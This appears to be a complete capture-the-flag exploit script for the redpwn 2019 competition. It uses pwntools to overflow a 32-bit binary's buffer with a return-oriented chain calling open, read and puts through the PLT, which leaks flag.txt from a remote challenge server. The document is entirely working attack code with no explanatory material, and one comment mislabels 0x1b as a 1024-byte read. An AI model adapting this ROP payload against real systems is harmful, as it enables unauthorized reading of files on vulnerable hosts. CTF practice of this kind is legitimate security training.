from pwn import *
import sys

buf = ""
buf += "A"*22
buf += p32(0x80490b0) # open PLT
buf += p32(0x80495ea) # pop2ret
buf += p32(0x804b0fa) # flag.txt\x00
buf += p32(0x00)
buf += p32(0x8049050) # read PLT
buf += p32(0x80495e9) # pop3ret
buf += p32(0x03) # FD 3
buf += p32(0x804c050) # buffer write address
buf += p32(0x1b) # 1024 byte read
buf += p32(0x8049090) # puts PLT
buf += p32(0xdeadbeef)
buf += p32(0x0804c050)

r = remote("chall.2019.redpwn.net",4005)

r.recvline()
r.send(buf)
r.sendline()

sys.stdout.write("[+][Flag] -> {}".format(r.recv(27)))

r.close()
